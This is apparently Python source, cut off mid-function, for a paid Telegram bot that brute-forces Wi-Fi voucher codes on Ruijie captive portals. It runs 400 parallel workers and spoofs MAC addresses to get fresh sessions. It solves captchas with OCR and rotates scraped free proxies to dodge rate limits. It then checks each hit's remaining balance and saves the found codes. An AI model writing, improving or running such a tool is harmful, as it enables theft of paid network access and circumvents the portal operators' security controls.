#Don't sell without permission.
"""
 NGATON SCANNER v3.1  
 Support our Telegram @NgaTON_0
"""

import os, re, json, time, random, string, hashlib, asyncio
import datetime, threading, sys, queue
import base64, urllib.request, urllib.error
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from http.server import HTTPServer, BaseHTTPRequestHandler
from concurrent.futures import ThreadPoolExecutor
from collections import OrderedDict
from typing import Optional, Tuple, List, Dict, Any

import aiohttp

try:
    from aiohttp_socks import ProxyConnector
    HAS_SOCKS = True
except ImportError:
    HAS_SOCKS = False
    ProxyConnector = None

try:
    import ddddocr
    HAS_OCR = True
except ImportError:
    HAS_OCR = False

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.constants import ParseMode
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, filters,
)

# ═══════════════════════════════════════════════════════════════
#  THREAD POOL
# ═══════════════════════════════════════════════════════════════

_executor = ThreadPoolExecutor(max_workers=64, thread_name_prefix="ocr")
try:
    loop = asyncio.new_event_loop()
    loop.set_default_executor(_executor)
    asyncio.set_event_loop(loop)
except Exception:
    pass

# ═══════════════════════════════════════════════════════════════
#  CONFIG — SPEED TUNED
# ═══════════════════════════════════════════════════════════════

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_IDS = [7856294500, 5115562507]

# ═══════════════════════════════════════════════════════════════
#  GITHUB DATABASE — data files mirrored to a GitHub repo
#  Local files stay as working copies: startup pulls the latest
#  copies down, every save also pushes up. Survives redeploys.
#  Set GITHUB_TOKEN in the host's variables to enable.
# ═══════════════════════════════════════════════════════════════

GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
GH_OWNER = os.environ.get("REPO_OWNER", "wykhanthtal")
GH_REPO = os.environ.get("REPO_NAME", "Ngaton")
GH_BRANCH = os.environ.get("REPO_BRANCH", "main")
_gh_sha_cache: Dict[str, str] = {}
_gh_lock = threading.Lock()

def _gh_enabled():
    return bool(GITHUB_TOKEN)

def _gh_req(method, url, payload=None):
    data = json.dumps(payload).encode() if payload is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Authorization", f"Bearer {GITHUB_TOKEN}")
    req.add_header("Accept", "application/vnd.github+json")
    req.add_header("X-GitHub-Api-Version", "2022-11-28")
    if data: req.add_header("Content-Type", "application/json")
    with urllib.request.urlopen(req, timeout=20) as r:
        body = r.read()
        return json.loads(body) if body else {}

def _gh_get_file(path):
    try:
        url = f"https://api.github.com/repos/{GH_OWNER}/{GH_REPO}/contents/{path}?ref={GH_BRANCH}"
        d = _gh_req("GET", url)
        if not isinstance(d, dict): return None, None
        if d.get("sha"): _gh_sha_cache[path] = d["sha"]
        if d.get("encoding") == "base64" and d.get("content"):
            return base64.b64decode(d["content"]), d.get("sha")
        return b"", d.get("sha")
    except Exception:
        return None, None

def _gh_put_file(path, data: bytes):
    if not _gh_enabled(): return False
    url = f"https://api.github.com/repos/{GH_OWNER}/{GH_REPO}/contents/{path}"
    for _ in range(3):
        try:
            sha = _gh_sha_cache.get(path)
            if sha is None:
                _, sha = _gh_get_file(path)
            payload = {"message": f"db: update {path}", "branch": GH_BRANCH,
                       "content": base64.b64encode(data).decode()}
            if sha: payload["sha"] = sha
            d = _gh_req("PUT", url, payload)
            new_sha = (d.get("content") or {}).get("sha")
            if new_sha: _gh_sha_cache[path] = new_sha
            return True
        except urllib.error.HTTPError as e:
            if e.code in (409, 422):
                _gh_sha_cache.pop(path, None)
                continue
            return False
        except Exception:
            return False
    return False

def _gh_push_local(path):
    if not _gh_enabled(): return
    with _gh_lock:
        try:
            data = open(path, "rb").read() if os.path.exists(path) else b""
            _gh_put_file(path, data)
        except Exception: pass

def _gh_sync_down():
    if not _gh_enabled(): return 0
    n = 0
    try:
        url = f"https://api.github.com/repos/{GH_OWNER}/{GH_REPO}/contents/?ref={GH_BRANCH}"
        items = _gh_req("GET", url)
        if not isinstance(items, list): return 0
        for it in items:
            name = it.get("name", "")
            if it.get("type") != "file": continue
            if not (name.endswith(".json") or name.endswith(".txt")): continue
            if name == "requirements.txt": continue
            data, _ = _gh_get_file(name)
            if data is None: continue
            try:
                with open(name, "wb") as f: f.write(data)
                n += 1
            except OSError: pass
    except Exception: pass
    return n
CONTACT_USERNAME = "@NgaTON_0"
CONTACT_LINK = "https://t.me/NgaTON_0"

PROXY_FILE = "proxies.txt"
PORTAL_URL_PATH = "portal_url_"
KEYS_FILE = "keys.json"
USERS_FILE = "users.json"
BOT_USERS_FILE = "bot_users.json"
ADMIN_IDS_FILE = "admin_ids.json"
STATE_FILE = "state.json"

# ⚡ HARDCODED — Workers button removed
NUM_WORKERS = 400
MIN_WORKERS = 400
MAX_WORKERS = 400

MAX_CODES_PER_SID = 60
MAX_CODES_PER_SESSION = 999999
TIMEOUT_SEC = 10                
BALANCE_TIMEOUT = 4
CAPTCHA_MAX_RETRY = 2           
BALANCE_RETRY = 1               
BALANCE_WORKERS = 25            
DASH_MIN_INTERVAL = 1.5
HEARTBEAT_SEC = 60
CODE_DELAY = 0.0              
TRIED_FLUSH_EVERY = 5000        

DEFAULT_PORTAL_BASE = "https://portal-as.ruijienetworks.com"

PROXY_SOURCES = [
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
    "https://raw.githubusercontent.com/iplocate/free-proxy-list/main/protocols/http.txt",
    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&protocol=http",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
]

CHARSET_DIGITS = "0123456789"
CHARSET_ABC = "abcdefghijkmnpqrstuvwxyz"
CHARSET_ENG = "abcdefghijklmnopqrstuvwxyz"
CHARSET_MIX = "2345678abcdefghijkmnpqrstuvwxyz"

_T_D = tuple(CHARSET_DIGITS); _T_A = tuple(CHARSET_ABC)
_T_E = tuple(CHARSET_ENG); _T_M = tuple(CHARSET_MIX)

_MODE_SPEC: Dict[str, Tuple[tuple, int]] = {
    "num6": (_T_D, 6), "num7": (_T_D, 7), "num8": (_T_D, 8), "num9": (_T_D, 9),
    "abc6": (_T_A, 6),
    "eng6": (_T_E, 6), "eng7": (_T_E, 7), "eng8": (_T_E, 8), "eng9": (_T_E, 9),
    "mix6": (_T_M, 6), "mix7": (_T_M, 7), "mix8": (_T_M, 8), "mix9": (_T_M, 9),
}

MODES = {
    "num6": "NUM 6", "num7": "NUM 7", "num8": "NUM 8", "num9": "NUM 9",
    "abc6": "ABC 6",
    "eng6": "ENG 6", "eng7": "ENG 7", "eng8": "ENG 8", "eng9": "ENG 9",
    "mix6": "MIX 6", "mix7": "MIX 7", "mix8": "MIX 8", "mix9": "MIX 9",
    "custom": "CUSTOM",
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
]

# ═══════════════════════════════════════════════════════════════
#  TERMINAL LOG
# ═══════════════════════════════════════════════════════════════

cR = "\033[91m"; cG = "\033[92m"; cY = "\033[93m"
cC = "\033[96m"; cM = "\033[95m"; cB = "\033[1m"; cX = "\033[0m"

LOG_LOCK = threading.Lock()
_ALLOWED_LOG_ICONS = {"❌", "👑", "🎊", "📢", "🚀"}

def tlog(icon, msg, color=cC):
    if icon not in _ALLOWED_LOG_ICONS: return
    try:
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        with LOG_LOCK:
            print(f"{color}[{ts}] {icon} {msg}{cX}", flush=True)
    except Exception: pass

def tprint(msg, color=cC):
    try:
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        with LOG_LOCK:
            print(f"{color}[{ts}] {msg}{cX}", flush=True)
    except Exception: pass

def user_tag(uid, uname=None, name=None):
    parts = [f"ID:{uid}"]
    if uname: parts.append(f"@{uname}")
    elif name: parts.append(name)
    return " · ".join(parts)

# ═══════════════════════════════════════════════════════════════
#  GLOBAL
# ═══════════════════════════════════════════════════════════════

_ocr_instance = None
_ocr_lock = threading.Lock()
_proxy_manager: Optional["ProxyManager"] = None
user_scanners: Dict[int, dict] = {}
user_proxy_checks: Dict[int, dict] = {}
_pending_codes: Dict[int, set] = {}
_state_lock = threading.Lock()
_heartbeat_started = False

# ═══════════════════════════════════════════════════════════════
#  STATE
# ═══════════════════════════════════════════════════════════════

def _load_all_states() -> dict:
    try:
        if not os.path.exists(STATE_FILE): return {}
        with open(STATE_FILE, "r", encoding="utf-8") as f: return json.load(f)
    except Exception: return {}

def _save_all_states(data: dict):
    try:
        with _state_lock:
            tmp = STATE_FILE + ".tmp"
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            os.replace(tmp, STATE_FILE)
    except Exception: pass
    _gh_push_local(STATE_FILE)

def get_saved_state(uid: int) -> Optional[dict]:
    return _load_all_states().get(str(uid))

def set_saved_state(uid: int, data: dict):
    all_ = _load_all_states()
    all_[str(uid)] = data
    _save_all_states(all_)

def clear_saved_state(uid: int):
    all_ = _load_all_states()
    all_.pop(str(uid), None)
    _save_all_states(all_)

def serialize_state(ud: dict) -> dict:
    hits = []
    for h in ud.get("hit_details", []):
        t = h.get("time")
        at = t.strftime("%Y-%m-%d %H:%M:%S") if isinstance(t, datetime.datetime) else str(t)
        hits.append({
            "code": h.get("code", "?"),
            "plan": h.get("plan", "Unknown"),
            "time_str": h.get("time_str", "N/A"),
            "active_token": h.get("active_token", ""),
            "at": at,
        })
    return {
        "url": ud.get("portal_url", ""),
        "mode": ud.get("mode", "num6"),
        "counter": ud.get("counter", 0),
        "tried": ud.get("stats", {}).get("tried", 0),
        "hits": ud.get("stats", {}).get("hits", 0),
        "limits": ud.get("stats", {}).get("limits", 0),
        "net": ud.get("stats", {}).get("net", 0),
        "failed": ud.get("stats", {}).get("failed", 0),
        "last_hit": ud.get("last_hit"),
        "started_at": ud.get("started_at_str", datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
        "updated_at": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "hit_details": hits,
    }

def deserialize_hits(hits: list) -> list:
    result = []
    for h in hits:
        try:
            t = datetime.datetime.strptime(h.get("at", ""), "%Y-%m-%d %H:%M:%S")
        except Exception:
            t = datetime.datetime.now()
        result.append({
            "code": h.get("code", "?"),
            "plan": h.get("plan", "Unknown"),
            "time_str": h.get("time_str", "N/A"),
            "active_token": h.get("active_token", ""),
            "time": t,
        })
    return result

def save_state_now(uid: int, ud: dict):
    try: set_saved_state(uid, serialize_state(ud))
    except Exception: pass

# ═══════════════════════════════════════════════════════════════
#  TRIED CODES
# ═══════════════════════════════════════════════════════════════

def _tried_file(uid: int) -> str:
    return f"tried_{uid}.txt"

def load_tried(uid: int) -> set:
    f = _tried_file(uid)
    if not os.path.exists(f): return set()
    try:
        with open(f, "r", encoding="utf-8", errors="ignore") as fp:
            return set(l.strip() for l in fp if l.strip())
    except Exception: return set()

def flush_codes(uid: int):
    codes = _pending_codes.get(uid)
    if not codes: return
    try:
        with open(_tried_file(uid), "a", encoding="utf-8") as f:
            for c in codes: f.write(f"{c}\n")
        _pending_codes[uid] = set()
    except Exception: pass
    _gh_push_local(_tried_file(uid))

def add_pending(uid: int, code: str):
    _pending_codes.setdefault(uid, set()).add(code)

def remove_pending(uid: int, code: str):
    p = _pending_codes.get(uid)
    if p: p.discard(code)

def clear_tried(uid: int):
    _pending_codes.pop(uid, None)
    try:
        f = _tried_file(uid)
        if os.path.exists(f): os.remove(f)
    except Exception: pass
    _gh_push_local(_tried_file(uid))

# ═══════════════════════════════════════════════════════════════
#  HIT WRITER — PER-USER 
# ═══════════════════════════════════════════════════════════════

_hit_write_lock = threading.Lock()

def _hit_file(uid: int) -> str:
    return f"hits_{uid}.txt"

def write_hit_url_tagged(uid: int, portal_url: str, code: str, plan: str, time_str: str):
    try:
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        path = _hit_file(uid)
        with _hit_write_lock:
            url_header = f"═══ URL: {portal_url} ═══"
            has_url = False
            if os.path.exists(path):
                try:
                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
                        if url_header in f.read():
                            has_url = True
                except Exception: pass
            with open(path, "a", encoding="utf-8") as f:
                if not has_url:
                    f.write(f"\n{url_header}\n")
                    f.write(f"{'─' * 50}\n")
                f.write(f"[{now}] {code} | {plan} | {time_str}\n")
    except Exception: pass
    _gh_push_local(_hit_file(uid))

def clear_hits_file(uid: int):
    try:
        with open(_hit_file(uid), "w"): pass
    except Exception: pass
    _gh_push_local(_hit_file(uid))

# ═══════════════════════════════════════════════════════════════
#  JSON — MEMORY CACHED 
# ═══════════════════════════════════════════════════════════════

_json_cache: Dict[str, Any] = {}
_json_cache_lock = threading.Lock()

def _load_json(path):
    with _json_cache_lock:
        if path in _json_cache:
            return _json_cache[path]
    try:
        if not os.path.exists(path):
            with _json_cache_lock:
                _json_cache[path] = {}
            return {}
        with open(path, "r", encoding="utf-8") as f:
            d = json.load(f)
        with _json_cache_lock:
            _json_cache[path] = d
        return d
    except Exception:
        return {}

def _save_json(path, data):
    with _json_cache_lock:
        _json_cache[path] = data
    try:
        tmp = path + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        os.replace(tmp, path)
    except Exception: pass
    _gh_push_local(path)

def _load_json_list(path):
    with _json_cache_lock:
        if path in _json_cache:
            d = _json_cache[path]
            return d if isinstance(d, list) else []
    try:
        if not os.path.exists(path): return []
        with open(path, "r", encoding="utf-8") as f:
            d = json.load(f)
            d = d if isinstance(d, list) else []
        with _json_cache_lock:
            _json_cache[path] = d
        return d
    except Exception: return []

def _save_json_list(path, data):
    with _json_cache_lock:
        _json_cache[path] = data
    try:
        tmp = path + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        os.replace(tmp, path)
    except Exception: pass
    _gh_push_local(path)

def load_keys(): return _load_json(KEYS_FILE)
def save_keys(d): _save_json(KEYS_FILE, d)
def load_users(): return _load_json(USERS_FILE)
def save_users(d): _save_json(USERS_FILE, d)
def load_bot_users(): return _load_json(BOT_USERS_FILE)
def save_bot_users(d): _save_json(BOT_USERS_FILE, d)

def track_bot_user(user):
    try:
        bu = load_bot_users(); uid = str(user.id)
        info = bu.get(uid, {})
        info["id"] = user.id
        info["username"] = user.username or ""
        info["first_name"] = user.first_name or ""
        info["last_name"] = user.last_name or ""
        info["first_seen"] = info.get("first_seen", time.time())
        info["last_seen"] = time.time()
        info["seen_count"] = info.get("seen_count", 0) + 1
        bu[uid] = info
        save_bot_users(bu)
    except Exception: pass

# ═══════════════════════════════════════════════════════════════
#  ADMIN
# ═══════════════════════════════════════════════════════════════

def load_admin_ids():
    r = set(ADMIN_IDS)
    try:
        for x in _load_json_list(ADMIN_IDS_FILE):
            try: r.add(int(x))
            except (ValueError, TypeError): pass
    except Exception: pass
    return list(r)

def save_admin_ids(ids):
    try: _save_json_list(ADMIN_IDS_FILE, [int(x) for x in ids])
    except Exception: pass

def is_admin(user_id): return user_id in load_admin_ids()

def add_admin_id(uid):
    try:
        ids = load_admin_ids()
        if uid in ids: return False
        ids.append(int(uid)); save_admin_ids(ids); return True
    except Exception: return False

def remove_admin_id(uid):
    try:
        ids = load_admin_ids()
        if uid not in ids: return False
        ids.remove(int(uid)); save_admin_ids(ids); return True
    except Exception: return False

def check_user_access(user_id):
    if is_admin(user_id): return True, "Admin"
    users = load_users(); uinfo = users.get(str(user_id))
    if not uinfo: return False, "No access"
    exp = uinfo.get("expires_at", 0)
    if exp == 0: return True, "Unlimited"
    if time.time() > exp: return False, "Expired"
    rem = int(exp - time.time())
    return True, f"{rem//86400}d {(rem%86400)//3600}h {(rem%3600)//60}m"

MM_TZ = datetime.timezone(datetime.timedelta(hours=6, minutes=30))
def now_mm(): return datetime.datetime.now(MM_TZ)

def format_expiry_mm(ts):
    if ts == 0: return "♾ Unlimited"
    return datetime.datetime.fromtimestamp(ts, tz=MM_TZ).strftime("%Y-%m-%d %I:%M %p")

def generate_unique_key(existing):
    for _ in range(100):
        raw = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
        k = '-'.join(raw[i:i+4] for i in range(0, 16, 4))
        if k not in existing: return k
    return '-'.join(''.join(random.choices(string.ascii_uppercase + string.digits, k=4)) for _ in range(4))

DURATION_MAP = {
    "1h": (3600, "1 Hour"), "2h": (7200, "2 Hours"),
    "6h": (21600, "6 Hours"), "12h": (43200, "12 Hours"),
    "1d": (86400, "1 Day"), "2d": (172800, "2 Days"),
    "3d": (259200, "3 Days"), "5d": (432000, "5 Days"),
    "7d": (604800, "7 Days"), "10d": (864000, "10 Days"),
    "15d": (1296000, "15 Days"), "30d": (2592000, "30 Days"),
    "1y": (31536000, "1 Year"),
}

# ═══════════════════════════════════════════════════════════════
#  PROXY
# ═══════════════════════════════════════════════════════════════

class ProxyManager:
    def __init__(self, path):
        self.file_path = path
        self.proxies = []; self.bad_proxies = set()
        self.good_proxies = []; self.index = 0; self.good_index = 0
        self.lock = asyncio.Lock(); self.load()

    def _norm(self, p):
        p = (p or "").strip()
        if not p or p.startswith("#"): return None
        if not p.startswith(("http://", "https://", "socks4://", "socks5://")):
            p = "http://" + p
        return p

    def load(self):
        if not os.path.exists(self.file_path):
            try: open(self.file_path, "w").close()
            except OSError: pass
            self.proxies = []; return
        try:
            with open(self.file_path) as f:
                raw = [l.strip() for l in f if l.strip()]
            seen = set(); self.proxies = []
            for r in raw:
                p = self._norm(r)
                if p and p not in seen:
                    seen.add(p); self.proxies.append(p)
            random.shuffle(self.proxies)
        except Exception: self.proxies = []
        self.bad_proxies.clear(); self.index = 0

    def reload(self): self.load()

    def clear_file(self):
        try: open(self.file_path, "w").close()
        except OSError: pass
        self.proxies = []; self.bad_proxies.clear()
        self.good_proxies.clear(); self.index = 0
        _gh_push_local(self.file_path)

    def add(self, new_list):
        norm = [self._norm(p) for p in new_list if p.strip()]
        norm = [p for p in norm if p]
        existing = set(self.proxies); added = []
        for p in norm:
            if p not in existing:
                added.append(p); existing.add(p)
        if added:
            try:
                with open(self.file_path, "a") as f:
                    for p in added: f.write(p + "\n")
            except OSError: pass
        self.reload()
        _gh_push_local(self.file_path)
        return len(added)

    def mark_good(self, p):
        if p and p not in self.good_proxies: self.good_proxies.append(p)

    async def get_next(self):
        async with self.lock:
            if not self.proxies: return None
            if self.good_proxies and random.random() < 0.8:
                p = self.good_proxies[self.good_index % len(self.good_proxies)]
                self.good_index += 1; return p
            avail = [p for p in self.proxies if p not in self.bad_proxies]
            if not avail:
                self.bad_proxies.clear(); avail = self.proxies[:]
            p = avail[self.index % len(avail)]
            self.index += 1; return p

    async def mark_bad(self, p):
        if not p: return
        async with self.lock:
            self.bad_proxies.add(p)
            if p in self.good_proxies:
                try: self.good_proxies.remove(p)
                except ValueError: pass

    def stats(self):
        t = len(self.proxies); b = len(self.bad_proxies)
        return t, t - b

def get_pm():
    global _proxy_manager
    if _proxy_manager is None:
        _proxy_manager = ProxyManager(PROXY_FILE)
    return _proxy_manager

def make_connector(p):
    """Create fresh connector per session (no stale cache)."""
    if not p or not HAS_SOCKS: return None
    try:
        return ProxyConnector.from_url(p, ssl=False)
    except Exception: return None

# ═══════════════════════════════════════════════════════════════
#  OCR
# ═══════════════════════════════════════════════════════════════

def get_ocr():
    global _ocr_instance
    if _ocr_instance is None:
        with _ocr_lock:
            if _ocr_instance is None:
                if not HAS_OCR: raise RuntimeError("ddddocr")
                _ocr_instance = ddddocr.DdddOcr(show_ad=False)
    return _ocr_instance

def ocr_sync(data):
    try: return get_ocr().classification(data).strip().upper() or None
    except Exception: return None

# ═══════════════════════════════════════════════════════════════
#  CAPTCHA 
# ═══════════════════════════════════════════════════════════════

_captcha_cache: "OrderedDict[str, str]" = OrderedDict()
_CAPTCHA_CACHE_MAX = 8000
_captcha_lock = threading.Lock()

async def solve_captcha(session, url, headers):
    try:
        u = f"{url}&_t={int(time.time()*1000)}"
        async with session.get(u, headers=headers, ssl=False, timeout=5) as r:
            if r.status != 200: return None
            data = await r.read()
        if not data: return None
        h = hashlib.md5(data).hexdigest()
        with _captcha_lock:
            if h in _captcha_cache:
                _captcha_cache.move_to_end(h)
                return _captcha_cache[h]
        text = await asyncio.to_thread(ocr_sync, data)
        if not text: return None
        with _captcha_lock:
            if len(_captcha_cache) >= _CAPTCHA_CACHE_MAX:
                _captcha_cache.popitem(last=False)
            _captcha_cache[h] = text
        return text
    except Exception: return None

# ═══════════════════════════════════════════════════════════════
#  USER DATA
# ═══════════════════════════════════════════════════════════════

def get_ud(user_id):
    if user_id not in user_scanners:
        saved_url = None
        pf = f"{PORTAL_URL_PATH}{user_id}.txt"
        if os.path.exists(pf):
            try: saved_url = open(pf).read().strip() or None
            except OSError: pass
        user_scanners[user_id] = {
            "mode": "num6", "char_set": CHARSET_DIGITS, "code_len": 6,
            "start_digit": None, "counter": 600000,
            "portal_url": saved_url,
            "stop_event": asyncio.Event(),
            "dash_update_event": asyncio.Event(),
            "task": None, "scanner_task": None,
            "run_id": 0,                                    # ⚡ NEW
            "stats": {"tried": 0, "hits": 0, "limits": 0, "net": 0,
                      "expired": 0, "failed": 0, "start_time": time.time()},
            "hit_details": [], "tried_codes": set(), "recent_logs": [],
            "CURRENT_CODE": "----", "last_hit": None,
            "dash_msg_id": None, "menu_msg_id": None, "state": None,
            "num_workers": NUM_WORKERS, "balance_queue": asyncio.Queue(),
            "uname": "", "name": "",
            "started_at_str": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "stopped_by_user": False,
            "_export_sent": False,
        }
    return user_scanners[user_id]

def get_user_portal(uid):
    p = f"{PORTAL_URL_PATH}{uid}.txt"
    if os.path.exists(p):
        try: return open(p).read().strip() or None
        except OSError: pass
    return None

def set_user_portal(uid, url):
    try: open(f"{PORTAL_URL_PATH}{uid}.txt", "w").write(url)
    except OSError: pass
    _gh_push_local(f"{PORTAL_URL_PATH}{uid}.txt")

# ═══════════════════════════════════════════════════════════════
#  UTILS
# ═══════════════════════════════════════════════════════════════

def gen_mac(): return ":".join("%02x" % random.randint(0, 255) for _ in range(6))

# ═══════════════════════════════════════════════════════════════
#  SID
# ═══════════════════════════════════════════════════════════════

async def get_sid(session, portal_url, uid, run_id=None):
    ud = get_ud(uid)
    if run_id is not None and ud.get("run_id") != run_id: return None, None
    if ud["stop_event"].is_set(): return None, None
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    try:
        u = urlparse(portal_url)
        q = parse_qs(u.query)
        q["mac"] = [gen_mac()]
        spoofed = urlunparse(u._replace(query=urlencode(q, doseq=True)))
        async with session.get(spoofed, headers=headers, timeout=8, ssl=False) as r2:
            body = await r2.text()
            m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
            if m:
                nu = urljoin(spoofed, m.group(1))
                async with session.get(nu, headers=headers, timeout=8, ssl=False) as r3:
                    fu = str(r3.url)
            else: fu = str(r2.url)
        pq = parse_qs(urlparse(fu).query)
        sid = pq.get("sessionId", pq.get("sid", [None]))[0]
        if sid: return sid, gen_mac()
    except Exception: pass
    return None, None

# ═══════════════════════════════════════════════════════════════
#  TIME / PLAN
# ═══════════════════════════════════════════════════════════════

def _fmt_secs(s):
    try:
        s = float(s)
        if s < 0: return f"Expired ({int(s//60)}m)"
        m = int(s // 60)
        if m < 1: return f"{int(s)}s"
        h, mm = divmod(m, 60)
        return f"{h}h {mm}m" if h else f"{mm}m"
    except Exception: return None

def _parse_tv(v):
    if v is None: return None
    try:
        n = float(v)
        return _fmt_secs(n*60) if n < 100000 else _fmt_secs(n)
    except (ValueError, TypeError): pass
    s = str(v).strip().lower()
    if not s or s in ("n/a", "null", "none", "-", "", "0"): return None
    if "expired" in s: return s.replace("expired", "Expired")
    if re.match(r"^\d+\s*h", s) or re.match(r"^\d+\s*m", s): return s
    for pat, u in [(r"^(\d+)\s*(hour|hours|hr|hrs|h)$", "h"),
                   (r"^(\d+)\s*(minute|minutes|min|mins|m)$", "m"),
                   (r"^(\d+)\s*(second|seconds|sec|secs|s)$", "s"),
                   (r"^(\d+)\s*(day|days|d)$", "d")]:
        m = re.match(pat, s)
        if m: return f"{m.group(1)}{u}"
    m = re.match(r"^(\d+)\s*(month|months|mo)$", s)
    if m: return f"{int(m.group(1))*30}d"
    try:
        n = float(s)
        return _fmt_secs(n*60) if n < 100000 else _fmt_secs(n)
    except ValueError: pass
    return s if s else None

def deep_time(obj, d=0):
    if d > 5: return None
    if isinstance(obj, dict):
        if "totalMinutes" in obj:
            try:
                tm = abs(int(obj["totalMinutes"]))
                if tm > 0:
                    h, m = divmod(tm, 60); return f"{h}h {m}m"
            except (ValueError, TypeError): pass
        if "result" in obj and isinstance(obj["result"], dict):
            r = obj["result"]
            if "totalMinutes" in r:
                try:
                    tm = abs(int(r["totalMinutes"]))
                    if tm > 0:
                        h, m = divmod(tm, 60); return f"{h}h {m}m"
                except (ValueError, TypeError): pass
        for f in ["remainingMinutes", "remainMinutes", "remainingTime", "remainTime",
                  "balance", "remaining", "timeRemaining", "remainingSeconds",
                  "remainSeconds", "totalMinutes", "totalTime", "time", "duration", "expireTime"]:
            if f in obj:
                p = _parse_tv(obj[f])
                if p: return p
        for v in obj.values():
            if isinstance(v, (dict, list)):
                x = deep_time(v, d+1)
                if x: return x
    elif isinstance(obj, list):
        for it in obj:
            x = deep_time(it, d+1)
            if x: return x
    return None

def deep_plan(obj, d=0):
    if d > 5: return None
    if isinstance(obj, dict):
        if "profileName" in obj:
            v = obj["profileName"]
            if v and isinstance(v, str) and v.strip(): return v.strip()
        if "result" in obj and isinstance(obj["result"], dict):
            r = obj["result"]
            if "profileName" in r:
                v = r["profileName"]
                if v and isinstance(v, str) and v.strip(): return v.strip()
        for f in ["profileName", "planName", "plan", "profile", "packageName",
                  "package", "voucherName", "voucherType", "type", "name", "userGroup"]:
            if f in obj:
                v = obj[f]
                if v and isinstance(v, str) and v.strip(): return v.strip()
        for v in obj.values():
            if isinstance(v, (dict, list)):
                x = deep_plan(v, d+1)
                if x: return x
    elif isinstance(obj, list):
        for it in obj:
            x = deep_plan(it, d+1)
            if x: return x
    return None

# ═══════════════════════════════════════════════════════════════
#  SHARED BALANCE SESSION
# ═══════════════════════════════════════════════════════════════

_bal_session: Optional[aiohttp.ClientSession] = None
_bal_session_lock: Optional[asyncio.Lock] = None
_bal_init_lock = threading.Lock()

def _get_bal_lock():
    global _bal_session_lock
    if _bal_session_lock is None:
        with _bal_init_lock:
            if _bal_session_lock is None:
                _bal_session_lock = asyncio.Lock()
    return _bal_session_lock

async def _get_bal_session():
    global _bal_session
    if _bal_session is not None and not _bal_session.closed:
        return _bal_session
    lock = _get_bal_lock()
    async with lock:
        if _bal_session is None or _bal_session.closed:
            conn = aiohttp.TCPConnector(
                limit=200, ssl=False, ttl_dns_cache=600,
                enable_cleanup_closed=True, force_close=False,
            )
            _bal_session = aiohttp.ClientSession(
                connector=conn,
                timeout=aiohttp.ClientTimeout(total=BALANCE_TIMEOUT))
    return _bal_session

def _portal_base(portal_url: Optional[str]) -> str:
    if not portal_url:
        return DEFAULT_PORTAL_BASE
    try:
        u = urlparse(portal_url)
        if u.scheme and u.netloc:
            return f"{u.scheme}://{u.netloc}"
    except Exception:
        pass
    return DEFAULT_PORTAL_BASE

async def _bal_direct(token, base=None):
    if not token: return None, None
    base = base or DEFAULT_PORTAL_BASE
    url = f"{base}/api/auth/balance/getBalance/{token}"
    page = f"{base}/download/static/maccauth/src/balance.html?sessionId={token}&lang=en_US"
    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "content-type": "application/json;",
        "referer": page,
        "user-agent": random.choice(USER_AGENTS),
        "x-requested-with": "XMLHttpRequest",
    }
    try:
        session = await _get_bal_session()
    except Exception:
        return None, None

    for attempt in range(BALANCE_RETRY):
        try:
            async with session.get(url, headers=headers,
                                   timeout=BALANCE_TIMEOUT) as r:
                if r.status != 200:
                    await asyncio.sleep(0.1)
                    continue
                data = await r.json()
                plan = deep_plan(data) or "Unknown"
                ts = deep_time(data)
                if not ts:
                    inner = data.get("result", data)
                    if isinstance(inner, dict):
                        try:
                            tm = abs(int(inner.get("totalMinutes", 0)))
                            if tm > 0:
                                h, m = divmod(tm, 60)
                                ts = f"{h}h {m}m"
                        except (ValueError, TypeError):
                            pass
                if ts:
                    return plan, ts
        except Exception:
            await asyncio.sleep(0.1)
    return None, None

async def balance_worker_bg(uid, wid, run_id):
    ud = get_ud(uid)
    while not ud["stop_event"].is_set() and ud.get("run_id") == run_id:
        try:
            item = await asyncio.wait_for(ud["balance_queue"].get(), timeout=1.0)
        except asyncio.TimeoutError:
            continue
        except asyncio.CancelledError:
            break
        try:
            token, code = item
            base = _portal_base(ud.get("portal_url"))
            plan, ts = await _bal_direct(token, base)
            if ts:
                for hd in ud["hit_details"]:
                    if (hd.get("code") == code
                            and hd.get("time_str") in ("⏳", "...fetching...", None)):
                        hd["plan"] = plan or "Unknown"
                        hd["time_str"] = ts
                        hd["source"] = "direct"
                        break
                write_hit_url_tagged(uid, ud.get("portal_url", ""), code,
                                     plan or "Unknown", ts)
                ud["dash_update_event"].set()
            try: ud["balance_queue"].task_done()
